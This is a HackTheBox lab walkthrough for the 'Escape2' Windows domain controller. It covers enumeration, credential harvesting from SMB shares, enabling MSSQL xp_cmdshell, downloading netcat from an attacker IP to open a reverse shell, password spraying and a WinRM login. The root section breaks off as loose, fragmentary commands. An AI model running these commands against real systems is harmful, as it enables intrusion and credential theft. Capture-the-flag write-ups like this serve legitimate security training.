---
title: Escape2 - A HackTheBox machine
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - walkthrough
---
# Escape2 - A HackTheBox machine

## user.txt


```
  Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
```


As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su


We enumerate the services in the target:

```
sudo nmap -sV -sC ~ip -Pn --top-ports 10000
```

Output:

```
ot shown: 8362 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-31 13:06:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.118.128:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-31T13:05:43
|_Not valid after:  2055-01-31T13:05:43
| ms-sql-info: 
|   10.129.118.128:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-31T13:07:58+00:00; +4m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49725/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
60956/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 5m48s, deviation: 0s, median: 5m48s
| smb2-time: 
|   date: 2025-02-09T17:52:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    

```


We enumerate users and password policy with:

```
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --users
```

We save the output as users.txt: 

```
Administrator
Guest
krbtgt
ryan
oscar
sql_svc
rose
ca_svc
```

We enumerate users and password policy with:

```
crackmapexec smb $ip -u rose -p KxEPkKe6R8su --pass-pol
```

Output: 

```
SMB         10.129.48.159  445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.129.48.159 445    DC01             Reset Account Lockout Counter: 10 minutes 
SMB        10.129.48.159  445    DC01             Locked Account Duration: 10 minutes 
SMB         10.129.48.159  445    DC01             Account Lockout Threshold: None
SMB         10.129.48.159  445    DC01             Forced Log off Time: Not Set

```

We enumerate shares in 

```
crackmapexec smb 10.129.48.159 -u rose -p KxEPkKe6R8su --shares
```

And we connect to the existing shares. After browsing around we will download two files:

```
smbclient  \\\\10.129.48.159\\'Accounting Department' -U rose
# Enter password when prompted: KxEPkKe6R8su

dir
get accounting_2024.xlsx
get accounts.xlsx
quit
```

From these files we will extract the following users and passwords (we unzip them and read the xml files inside):

```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```

Now we can connet to the msSQL server:

```
python3 mssqlclient.py -p 1433 sa@10.129.42.172 
# When prompted, enter credentials: MSSQLP@ssw0rd!
```

In the connection to the mssql server we will be running as  admin:

```
# To allow advanced options to be changed.   
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

# **sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

# Now we can upload a nc file to obtain a reverse shell:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.113/nc64.exe -outfile nc64.exe"

# Open a listener
nc -lnvp 1234

# And trigger the listener
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.113 1234";
```

Located at C:\ we note the following file c:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI, where we can retrieve the following credentials:

```
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
```

Now we can try to do a password spray attack:

```
crackmapexec smb 10.129.42.172 -u ~/borrar/users.txt -p WqSZAF6CysDQbGb3  --continue-on-success | grep +
```

And we obtain: 

```
10.129.42.172   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
10.129.42.172   445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
```

Meaning that we can try to connect with evil-winrm with ryan:WqSZAF6CysDQbGb3: 

```
evil-winrm -i 10.129.42.172 -u ryan -p WqSZAF6CysDQbGb3 
```

As ryan, we can go to c:\Desktop and print user.txt.

Results: 21033cea9bb3884f391ee21423396f70

## root.txt


```

certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip


crackmapexec smb 10.129.251.165 -u ryan -p WqSZAF6CysDQbGb3  --sam

$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('sequel.htb\ca_svc', $SecPassword)


Set-DomainObjectOwner -TargetIdentity dfm -OwnerIdentity harmj0y


$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule( (New-Object System.Security.Principal.NTAccount($identity)), "WriteOwner", "Allow" )
```
```
